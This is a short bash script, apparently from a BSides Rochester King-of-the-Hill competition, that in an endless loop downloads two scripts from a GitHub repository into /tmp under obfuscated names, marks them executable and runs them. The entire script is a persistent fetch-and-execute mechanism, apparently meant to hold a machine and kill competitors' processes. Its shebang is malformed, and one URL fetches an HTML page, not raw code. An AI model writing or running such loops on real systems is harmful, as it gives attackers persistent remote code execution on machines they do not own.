!#/bin/bash
while :
do
	wget -O /tmp/aldskf.sh https://github.com/bd3r/BsidesRochesterKOTH/blob/master/changeImage.sh
	wget -O /tmp/djflw.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/newkill.sh

	sleep 1
	chmod +x /tmp/aldskf.sh & chmod +x /tmp/djflw.sh
	/tmp/aldskf.sh & /tmp/djflw.sh  
done
